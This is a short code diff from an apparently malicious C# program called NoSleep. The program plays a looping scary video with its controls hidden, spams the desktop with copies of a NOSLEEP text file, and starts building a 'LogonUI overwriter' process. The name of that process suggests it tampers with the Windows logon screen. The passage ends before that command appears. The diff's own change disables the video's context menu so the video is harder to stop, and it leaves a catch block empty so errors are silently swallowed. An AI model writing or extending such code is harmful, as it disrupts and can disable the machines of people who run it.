@@ -83,6 +83,7 @@ namespace NoSleep
             //Play video if exists
             if(File.Exists(@"C:\Program Files\Temp\some_video.mp4"))
             {
+                this.scary_video.enableContextMenu = false;
                 this.scary_video.uiMode = "none";
                 this.scary_video.settings.setMode("loop", true);
                 this.scary_video.URL = @"C:\Program Files\Temp\some_video.mp4";
@@ -102,7 +103,11 @@ namespace NoSleep
                 {
                     File.Copy(desktop_files + @"\NOSLEEP_NOSLEEP_NOSLEEP_NOSLEEP_NOSLEEP_NOSLEEP_NOSLEEP_NOSLEEP_NOSLEEP.txt", desktop_files + $"\\NOSLEEP_NOSLEEP_NOSLEEP_NOSLEEP_NOSLEEP_NOSLEEP_NOSLEEP_NOSLEEP_NOSLEEP({s}).txt");
                 }
-            }catch(Exception ex) { }
+            }
+            catch(Exception ex) 
+            {
+                
+            }
             //Create LogonUI overwriter
             const string quote = "\"";
             ProcessStartInfo del_logon = new ProcessStartInfo();
